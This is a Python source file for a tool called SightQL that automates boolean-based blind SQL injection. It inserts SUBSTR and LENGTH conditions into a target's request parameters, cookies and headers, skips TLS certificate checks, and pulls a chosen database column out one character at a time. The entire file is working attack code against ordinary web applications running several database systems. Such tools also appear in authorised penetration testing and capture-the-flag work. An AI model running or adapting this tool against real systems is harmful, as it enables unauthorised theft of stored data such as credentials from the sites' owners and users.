import requests
import json
import string
import time
import urllib3
from pwn import log

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SightQLException(Exception):
    
    def __init__(self, message=""):
        self.message = message
        super().__init__(self.message)

class SightQL:
    data_exfil = ""
    length = -1

    chars = string.printable[:94]

    allowed_methods = [
        "GET",
        "POST"
    ]

    allowed_dbms = [
        "MYSQL",
        "MSSQL",
        "ORACLE",
        "POSTGRESQL",
        "SQLITE"
    ]

    def __init__(self, target:str, params:dict, column_to_exfil:str, predicate, data_found="", length=-1, method="GET", cookies={}, headers={}, user_agent="", json_mode=False, verbose=False, sleep=0.0, dbms="MYSQL") -> None:
        self.target = target
        self.params = params
        self.data_exfil = data_found

        if self.check_method(method):
            if method == "GET":
                self.fetch = self.get_fetch
            else:
                self.fetch = self.post_fetch
        else:
            raise SightQLException(f"Invalid method name '{method}'")
        
        dbms = dbms.upper()
        if self.check_dbms(dbms):
            self.dbms = dbms
        else:
            raise SightQLException(f"Invalid DBMS '{dbms}'")
        
        self.column = column_to_exfil
        self.cookies = cookies
        self.headers = headers
        if user_agent != "":
            self.headers["User-Agent"] = user_agent

        self.json_mode = json_mode
        self.verbose = verbose
        self.sleep = sleep

        self.predicate = predicate

        self.length = length

        if self.length == -1:
            self.get_size()

    

    def get_fetch(self, data, cookies={}, headers={}) -> requests.models.Response:
        return requests.get(
                self.target, 
                params=data, 
                cookies=cookies, 
                headers=headers,
                verify=False
            )
    
    def post_fetch(self, data, cookies={}, headers={}) -> requests.models.Response:
        return requests.post(
                self.target, 
                data=data, 
                cookies=cookies, 
                headers=headers, 
                json=json.dumps(data) if self.json_mode else {},
                verify=False
            )
    
    def format_dict_data(self, data:dict, char:str):
        res = {}
        
        for k, v in data.items():
            res[k] = v.replace(
                "{payload}",
                f"SUBSTR({self.column},{len(self.data_exfil) + 1},1)='{char}'"
            )

        return res
    
    def format_dict_length(self, data:dict, i:int):
        res = {}
        keyword = "LENGTH" if self.dbms != "MSSQL" else "LEN"
        
        for k, v in data.items():
            res[k] = v.replace(
                "{payload}",
                f"{keyword}({self.column})={i}"
            )

        return res

    def check_method(self, method:str) -> bool:
        return method in self.allowed_methods
    
    def check_dbms(self, dbms:str) -> bool:
        return dbms in self.allowed_dbms
    
    def get_size(self):
        s = log.progress("Getting size")
    
        i = 1
        while True:
            s.status(f"{i}")
            data = self.format_dict_length(self.params, i)
            cookies = self.format_dict_length(self.cookies, i)
            headers = self.format_dict_length(self.headers, i)

            if self.verbose:
                log.info(f"Data sent: {data}")
                log.info(f"Headers sent: {headers}")
                log.info(f"Cookies sent: {cookies}")

            r = self.fetch(data, cookies, headers)
            if self.predicate(r):
                self.length = i
                s.success(f"{i}")
                break
            i += 1
    
    def restore(self):
        s = log.progress("Getting data")
        for _ in range(self.length - len(self.data_exfil)):
            for c in self.chars:
                data = self.format_dict_data(self.params, c)
                cookies = self.format_dict_data(self.cookies, c)
                headers = self.format_dict_data(self.headers, c)

                if self.verbose:
                    log.info(f"Data sent: {data}")
                    log.info(f"Headers sent: {headers}")
                    log.info(f"Cookies sent: {cookies}")

                r = self.fetch(data, cookies, headers)
                if self.predicate(r):
                    self.data_exfil += c
                    s.status(f"{self.data_exfil}")
                    break
                time.sleep(self.sleep)


        s.success(f"{self.data_exfil}")
        